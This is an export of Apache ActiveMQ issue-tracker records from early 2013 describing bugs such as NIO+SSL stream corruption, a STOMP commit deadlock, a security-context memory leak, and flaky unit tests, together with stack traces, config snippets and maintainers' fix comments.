NIO+SSL Connector corrupts stream when data size exceeds SSL buffer size,AMQ-4321,12632452,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,ccondit,ccondit,14/Feb/13 19:47,02/May/13 02:30,14/Jul/23 05:43,14/Feb/13 21:59,5.6.0,5.7.0,5.8.0,,,5.9.0,,,Transport,,,,0,nio,ssl,transport,,,,,,"When using the default enabledCipherSuites settings on Java 7, the NIO+SSL connector corrupts the SSL output stream when asked to flush a buffer larger than the SSL buffer size (approx. 16 KB). This is reproducible by sending a single BytesMessage >= 16KB to the broker and attempting to consume it. ","JDK 1.7.0_09, Windows 7 x64, Linux CentOS5 64-bit
",ccondit,tabish,tom_m,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4135,,,"14/Feb/13 20:09;ccondit;AMQ4321-UnitTest.patch;https://issues.apache.org/jira/secure/attachment/12569379/AMQ4321-UnitTest.patch","14/Feb/13 20:09;ccondit;AMQ4321.patch;https://issues.apache.org/jira/secure/attachment/12569378/AMQ4321.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,312948,,,Thu Feb 14 21:59:03 UTC 2013,,,,,,,Patch Available,,,,"0|i1i07r:",313294,,,,,,,,,,,,,,,,,,,,,"14/Feb/13 20:09;ccondit;Added patches to add unit test and bug fix.;;;","14/Feb/13 21:22;tabish;Something about that code was bothering me last time, looks like you found it.  I think we can just move the call to data.remaining() to the end of the while instead of have it in two places and be done with it.  ;;;","14/Feb/13 21:59;tabish;Fixed in trunk, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Destinations are not auto created when using Composite Destination configured on the broker,AMQ-4320,12632436,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,14/Feb/13 18:55,23/Dec/13 00:06,14/Jul/23 05:43,14/Feb/13 19:01,,,,,,5.9.0,,,,,,,0,,,,,,,,,"When using a composite destination as defined below, the destination are not auto created:

{code}
<destinationInterceptors>
              <virtualDestinationInterceptor>
                <virtualDestinations>
                  <compositeQueue name=""MY.QUEUE"">
                    <forwardTo>
                      <queue physicalName=""FOO"" />
                      <topic physicalName=""BAR"" />
                    </forwardTo>
                  </compositeTopic>
                </virtualDestinations>
              </virtualDestinationInterceptor>
</destinationInterceptors>
{code}

The destinations FOO and BAR are not created if they do not exist and the messages are dropped.

Current work around is to define startup destinations as shown below or ensure the destinations are created by consumers prior to sending messages to the composite destination.

{code}
<destinations>
              <queue physicalName=""FOO"" />
              <topic physicalName=""BAR"" />
</destinations>
{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4953,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,312932,,,Thu Feb 14 19:01:50 UTC 2013,,,,,,,,,,,"0|i1i047:",313278,,,,,,,,,,,,,,,,,,,,,"14/Feb/13 19:01;chirino;Fixed now.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"ActiveMQ destination are tracked by securitycontext and never cleaned up, causes ActiveMQ to crash.",AMQ-4319,12632413,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,mwoodson,mwoodson,14/Feb/13 17:13,25/Feb/13 18:24,14/Jul/23 05:43,25/Feb/13 18:24,5.6.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"We are using ActiveMQ + mcollective.  With mcollective, we are using the ""activemq connector ([http://docs.puppetlabs.com/mcollective/reference/plugins/connector_activemq.html])""

We are running ActiveMQ in the EC2 Cloud, so we have enabled security for the connections being made.

We have 2 ActiveMQ servers that are configures as network of brokers, about around 200 nodes that we communicate with.

The problem we are seeing is that after about 1 week in operation, ActiveMQ will crash because it runs out of memory.  We have been monitoring the heap, and you will see it rise during the week, and then the wrapper will eventually restart activemq

{code:title=wrapper.log}
ERROR  | wrapper  | 2013/02/01 09:38:33 | JVM appears hung: Timed out waiting for signal from JVM.
ERROR  | wrapper  | 2013/02/01 09:38:33 | JVM did not exit on request, terminated
INFO   | wrapper  | 2013/02/01 09:38:33 | JVM exited on its own while waiting to kill the application.
STATUS | wrapper  | 2013/02/01 09:38:33 | JVM exited in response to signal SIGKILL (9).
STATUS | wrapper  | 2013/02/01 09:38:38 | Launching a JVM...}
{code}

In the activemq connector page, it says that there needs to be cleanup of queues.  This is put into place.

I did a heap dump, and with external help I was told that ""the authentication plugin is retaining destinations in a cached connection""

These connections need to be deleted and cleaned up as well.
",RHEL 6,gtully,mwoodson,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Feb/13 17:02;gtully;AMQ-4319-unittest.patch;https://issues.apache.org/jira/secure/attachment/12569563/AMQ-4319-unittest.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,312909,,,Mon Feb 25 18:24:43 UTC 2013,,,,,,,,,,,"0|i1hzz3:",313255,,,,,,,,,,,,,,,,,,,,,"14/Feb/13 18:32;gtully;the problem is the org.apache.activemq.security.AuthorizationBroker, it adds destination to the security context on addProducer/addConsumer but when these destinations are gc'ed they are not removed from the connection context.
With a long lived connection, these can accumulate.

securityContext.getAuthorizedReadDests().put(info.getDestination(), info.getDestination());

the fix is probably in org.apache.activemq.security.AuthorizationBroker#removeDestination, where we need to remove the destination from the auth map of all connections.

org.apache.activemq.security.SimpleAuthenticationPluginTest would be a simple place to add a test case, once the gcInactive is added to org/apache/activemq/security/simple-auth-broker.xml

creating producers/consumers to USERS.1-1000 and having them gced and checking jvm stack usage should expose the problem in a unit test.;;;","15/Feb/13 17:02;gtully;unit test - fix is not trivial. will take a bit of work.;;;","25/Feb/13 18:24;tabish;Fix and test added on trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-camel feature doesn't work,AMQ-4317,12632395,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,14/Feb/13 15:34,17/Jun/13 19:12,14/Jul/23 05:43,14/Feb/13 15:48,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"activemq-camel feature fails with

{code}karaf@root> features:install activemq-camel
Error executing command: Jar is not a bundle, no Bundle-SymbolicName
mvn:org.apache.activemq/activemq-camel/5.8.0
karaf@root>{code}

error",,arnoud,betzel,boday,dejanb,geerzo,lichtin,yziquel,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,312891,,,Mon Jun 17 19:12:40 UTC 2013,,,,,,,,,,,"0|i1hzv3:",313237,,,,,,,,,,,,,,,,,,,,,"14/Feb/13 15:48;dejanb;This should be now fixed. The activemq-camel is a bundle again, and the feature is also fixed to comply with other features.;;;","17/Jun/13 17:25;boday;any plans to include this fix in a 5.8.X release?  otherwise, when will 5.9 be available?;;;","17/Jun/13 19:12;geerzo;I'd like to see this in 5.8.x as well;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Duplicate files in distribution,AMQ-4315,12632293,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,jgomes,jgomes,13/Feb/13 22:12,20/Feb/13 17:10,14/Jul/23 05:43,20/Feb/13 17:10,5.8.0,,,,,5.x,,,Broker,,,,0,,,,,,,,,"There are a couple of duplicate files in the ActiveMQ 5.8.0 distribution package.  Here are the locations:

lib/extra/activemq-leveldb-store-5.8.0.jar
lib/optional/activemq-leveldb-store-5.8.0.jar

lib/activemq-spring-5.8.0.jar
lib/optional/activemq-spring-5.8.0.jar

Not sure which location is the ""real"" location.",,ceposta,jgomes,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,312789,,,Thu Feb 14 00:06:34 UTC 2013,,,,,,,,,,,"0|i1hz8f:",313135,,,,,,,,,,,,,,,,,,,,,"14/Feb/13 00:06;ceposta;Fixed with r1445995, should be fixed in next nightly build;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Client Connections Not Displayed on Admin Webpage,AMQ-4314,12632289,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,jgomes,jgomes,13/Feb/13 22:07,20/Mar/13 17:43,14/Jul/23 05:43,20/Mar/13 17:43,5.8.0,,,,,5.9.0,,,Broker,,,,0,admin-interface,,,,,,,,"On the Web Admin Connections page, my NMS Openwire client connection does not show up.  The client is actually connected and sending/receiving messages.

Steps to duplicate:
1. Install fresh ActiveMQ 5.8.0 (to verify that custom configuration did not introduce the problem).
2. Launch the broker.
3. Connect Openwire client.  (I use C# NMS).
4. In the web admin, navigate to the Connections page.

Results:
The Openwire section of the page does not list the client.

Expected:
The client connection should be listed.

Notes:
I have not verified other types of connections (e.g., STOMP) to see if they are experiencing the same problem.  This is a critical feature for our use case.",Windows and Linux,alsoloplan,jgomes,shendley,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4393,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,312785,,,Wed Mar 20 17:43:58 UTC 2013,,,,,,,,,,,"0|i1hz7j:",313131,Regression,,,,,,,,,,,,,,,,,,,,"13/Feb/13 22:17;jgomes;This was introduced in 5.8.0.  I just re-checked 5.7.0, and it works fine.;;;","20/Mar/13 17:43;tabish;This should be fixed in the next nightly.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NIO+SSL Connector fails with SSL exception under high concurrency,AMQ-4312,12632109,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,ccondit,ccondit,12/Feb/13 22:42,13/Feb/13 00:41,14/Jul/23 05:43,13/Feb/13 00:40,5.7.0,5.8.0,,,,5.9.0,,,Transport,,,,0,nio,ssl,transport,,,,,,"Under high concurrency, the NIO+SSL connector causes client connections to fail with random SSL exceptions (usually bad record MAC or invalid padding) after a period of time.

For example:

{code}
javax.net.ssl.SSLException: bad record MAC
	at sun.security.ssl.Alerts.getSSLException(Alerts.java:208)
	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1902)
	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1855)
	at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:988)
	at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:884)
	at sun.security.ssl.AppInputStream.read(AppInputStream.java:102)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:50)
	at org.apache.activemq.transport.tcp.TcpTransport$2.fill(TcpTransport.java:604)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:58)
	at org.apache.activemq.transport.tcp.TcpTransport$2.read(TcpTransport.java:589)
	at java.io.DataInputStream.readInt(DataInputStream.java:387)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:275)
	at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:221)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:213)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:722)</pre>
{code}


I suspect this may be related to AMQ-4135, since we are seeing nearly identical failure modes.

I am able to duplicate these results fairly consistently using a variant of NIOSSLLoadTest which uses 10 producers, 10 consumers, 10000 messages, and a bytes message of size 4096 with all producers and consumers using separate (multiplexed) sessions.","JDK 1.7.0_09, Windows 7 x64, Linux CentOS5 64-bit",ccondit,donnchadh,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4135,,,,,,,,,,,,,,,,"12/Feb/13 23:26;ccondit;AMQ-4312-test.patch;https://issues.apache.org/jira/secure/attachment/12569101/AMQ-4312-test.patch","12/Feb/13 23:22;ccondit;AMQ-4312.patch;https://issues.apache.org/jira/secure/attachment/12569100/AMQ-4312.patch","12/Feb/13 22:43;ccondit;NIOSSLConcurrencyTest.java;https://issues.apache.org/jira/secure/attachment/12569089/NIOSSLConcurrencyTest.java",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,312605,,,Wed Feb 13 00:40:20 UTC 2013,,,,,,,Patch Available,,,,"0|i1hy3b:",312951,,,,,,,,,,,,,,,,,,,,,"12/Feb/13 22:43;ccondit;Attached unit test which demonstrates the problem.;;;","12/Feb/13 23:22;ccondit;Attached patch which seems to fix the issue.;;;","12/Feb/13 23:26;ccondit;Attached patch for unit test.;;;","13/Feb/13 00:04;tabish;Nice find, looks right.  I'm testing things now for any side effects. ;;;","13/Feb/13 00:40;tabish;Patch applied, great work. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
org.apache.activemq.transport.http.HttpClientReconnectTest hangs occasionally,AMQ-4307,12631497,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kearls,kearls,08/Feb/13 18:50,10/Jul/13 12:38,14/Jul/23 05:43,09/Jul/13 19:45,,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,"This test occasionally hangs, causing the build to hang.  I haven't been able to reproduce it yet, but have seen it several times on the Fuse Hudson instance.  I'll attach a patch which adds a timeout.
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4308,,,,,,,,,,,,,,,,,,,,,,,,"08/Feb/13 18:51;kearls;AMQ4307.patch;https://issues.apache.org/jira/secure/attachment/12568615/AMQ4307.patch","08/Feb/13 21:08;kearls;HttpClientReconnectTestStack.txt;https://issues.apache.org/jira/secure/attachment/12568630/HttpClientReconnectTestStack.txt",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,311993,,,Wed Jul 10 12:38:55 UTC 2013,,,,,,,Patch Available,,,,"0|i1hubb:",312339,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"08/Feb/13 19:05;tabish;patch applied.  Would be great if you can get a stack trace of the hung test.;;;","08/Feb/13 21:08;kearls;Stack trace from a hung test;;;","08/Feb/13 21:35;tabish;That's an interesting one, looks like we are stuck when we processing the shutdowninfo command which triggers us calling a stop while the run method is processing some incoming request.  ;;;","11/Mar/13 14:34;tabish;Kevin, can you retest this one as well and see if the HttpClient update might have also resolved it, not reproducible here. ;;;","11/Mar/13 14:37;kearls;Sure, I'll start it now.
;;;","11/Mar/13 15:45;kearls;Sorry, this is still failing on my old mac.  It failed after 3 iterations on the first attempt, 48 the second time.
;;;","12/Mar/13 16:50;tabish;This one is a bit tricky.  The lock occurs because the httpMethod is finishing its write and need to update the SSL Socket's state table and some other internal housekeeping and we come in and try to abort the method and close the socket right away.  We should probably at least give the run method a chance to finish before we hard abort the httpMethod, question is how long do we wait.  Some Google searching seems to indicate that doesn't happen on every JDK version.;;;","09/Jul/13 19:45;tabish;I worked around it as best I could, on my current 1.7 JVM I don't see the lock so hopefully this disappears as later JVMs are installed. ;;;","10/Jul/13 12:38;kearls;This now manages to get through 100 iterations on my old slow Mac, so I think we're good.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BTreeIndexTest.testRandomAddRemove() is very slow on Solaris,AMQ-4306,12631493,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,08/Feb/13 18:38,08/Mar/13 19:18,14/Jul/23 05:43,08/Mar/13 19:18,,,,,,,,,Test Cases,,,,0,,,,,,,,,"This test runs very slowly on Solaris, taking 8-10 times as long as on Mac or Ubuntu.  It looks the the difference is almost all in the section where it builds the index.  I'll try to get more info later.

For now I'm attaching a patch which bumps up the timeout for this test so it doesn't cause the build to fail.",Solaris 2.10 with JDK7,gtully,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Mar/13 18:54;kearls;AMQ-4306.patch;https://issues.apache.org/jira/secure/attachment/12572797/AMQ-4306.patch","08/Feb/13 18:40;kearls;AMQ4306.patch;https://issues.apache.org/jira/secure/attachment/12568612/AMQ4306.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,311989,,,Fri Mar 08 19:18:47 UTC 2013,,,,,,,,,,,"0|i1huaf:",312335,,,,,,,,,,,,,,,,,,,,,"08/Feb/13 18:40;kearls;Increase timeout for testRandomAddRemove to 15 minutes;;;","08/Feb/13 19:03;tabish;patch applied.;;;","07/Mar/13 23:12;tabish;Not sure there's much more we can do here, the problem is more likely to be OS configuration issue or just a really slow disk or controller. ;;;","08/Mar/13 10:30;gtully;yep, this test causes lots of random io to the pagefile to really stress the index paging logic. Unfortunately it needs to be run for a reasonable period to validate, but there may be little value in additional platform executions of this test, adding an sunos exclusion may make sense.;;;","08/Mar/13 18:54;kearls;Updated the pom to exclude BTreeIndexTest on Solaris, and also adds a couple of tests we've been excluding on the Fuse CI.
;;;","08/Mar/13 19:18;tabish;patch applied;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
stomp deadlock on commit,AMQ-4297,12630921,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,05/Feb/13 18:27,05/Feb/13 18:32,14/Jul/23 05:43,05/Feb/13 18:32,5.8.0,,,,,5.8.0,,,STOMP,,,,0,,,,,,,,,"{code}Found one Java-level deadlock:
=============================
""ActiveMQ Transport: ssl://27.0.0.1:63934"":
  waiting for ownable synchronizer 7f40f40b0, (a java.util.concurrent.locks.ReentrantLock$NonfairSync),
  which is held by ""ActiveMQ BrokerService[localhost] Task-2""
""ActiveMQ BrokerService[localhost] Task-2"":
  waiting to lock monitor 7f90ca08ea30 (object 7f35b97b0, a org.apache.activemq.transport.stomp.StompSubscription),
  which is held by ""ActiveMQ Transport: ssl://27.0.0.1:63934""

Java stack information for the threads listed above:
===================================================
""ActiveMQ Transport: ssl://27.0.0.1:63934"":
	at sun.misc.Unsafe.park(Native Method)
	- parking to wait for  <7f40f40b0> (a java.util.concurrent.locks.ReentrantLock$NonfairSync)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:156)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:842)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178)
	at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)
	at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:43)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288)
	at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:84)
	at org.apache.activemq.transport.stomp.StompSubscription.onStompCommit(StompSubscription.java:122)
	- locked <7f35b97b0> (a org.apache.activemq.transport.stomp.StompSubscription)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommit(ProtocolConverter.java:502)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:241)
	at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:73)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91)
	at org.apache.activemq.transport.stomp.StompSslTransportFactory$1$1.doConsume(StompSslTransportFactory.java:70)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:680)
""ActiveMQ BrokerService[localhost] Task-2"":
	at org.apache.activemq.transport.stomp.StompSubscription.onMessageDispatch(StompSubscription.java:70)
	- waiting to lock <7f35b97b0> (a org.apache.activemq.transport.stomp.StompSubscription)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onActiveMQCommand(ProtocolConverter.java:857)
	at org.apache.activemq.transport.stomp.StompTransportFilter.oneway(StompTransportFilter.java:61)
	at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:322)
	at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:304)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
	at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1378)
	at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:897)
	at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:943)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)

Found 1 deadlock.
{code}
from org.apache.activemq.transport.stomp.StompTest#testPrefetchSize",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,311417,,,Tue Feb 05 18:32:36 UTC 2013,,,,,,,,,,,"0|i1hqrj:",311763,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"05/Feb/13 18:32;gtully;http://svn.apache.org/viewvc?rev=1442688&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unit tests fail intermittently when using LevelDB adapter,AMQ-4296,12630676,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,04/Feb/13 17:25,22/Jul/13 20:55,14/Jul/23 05:43,22/Jul/13 20:55,5.8.0,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,"A couple of the unit tests that have be modified to run with LevelDB as the persistence adapter fail intermittently.

AMQ2870Test
AMQ2584Test#testSize
DuranleSubscriptionOfflineTest#testConsumeOnlyMatchedMessages
LevelDBXARecoveryBrokerTest#testTopicPersistentPreparedAcksAvailableAfterRestartAndRollback",,gtully,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4329,,AMQ-4268,,,,,,,,,,,,,,,,,,,,,,,,"28/Mar/13 22:10;kearls;AMQ-4415B.patch;https://issues.apache.org/jira/secure/attachment/12575957/AMQ-4415B.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,311172,,,Mon Jul 22 20:55:15 UTC 2013,,,,,,,,,,,"0|i1hp9b:",311519,,,,,,,,,,,,,,,,,,,,,"04/Feb/13 17:28;tabish;We can disable the LevelDB variations for now and address these in v5.9 as KahaDB is still the default persistence adapter. ;;;","19/Feb/13 12:22;gtully;adding failing org.apache.activemq.broker.region.cursors.StoreQueueCursorJournalNoDuplicateTest, but scenario where journal is used over a journaled pa is dubious.;;;","19/Feb/13 12:50;gtully;org.apache.activemq.bugs.AMQ2149Test needs a leveldb variant, and will fail atm;;;","19/Feb/13 13:49;gtully;also - org.apache.activemq.usecases.ThreeBrokerVirtualTopicNetworkAMQPATest;;;","28/Mar/13 22:08;kearls;Also, these cause issues at least on AIX and Solaris.

AMQ2584Test 
AMQ2870Test 
QueueMbeanRestartTest 
FailoverTransactionTest
ConcurrentProducerDurableConsumerTest
DurableSubscriptionOfflineTest
;;;","28/Mar/13 22:10;kearls;Could you apply this patch to FailoverTransactionTest?  On AIX and Solaris when testFailoverCommitReplyLost is run with LevelDB it will hang.
;;;","28/Mar/13 23:13;tabish;Patch applied.;;;","02/Apr/13 20:56;kearls;Also: QueueMasterSlaveSingleUrlTest
